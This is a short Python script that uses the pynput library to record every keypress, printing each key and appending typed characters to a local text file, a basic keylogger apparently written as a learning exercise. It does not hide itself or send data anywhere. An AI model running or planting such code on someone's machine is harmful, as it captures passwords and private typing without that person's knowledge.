from pynput import keyboard


def captureKey(key):
    print(str(key))

    try:
        with open("logFile.txt", 'a') as logkey:
            char = key.char
            logkey.write(char)

    except:
        print("Error Writing to Logfile")


listener = keyboard.Listener(on_press= captureKey)
listener.start()
input()
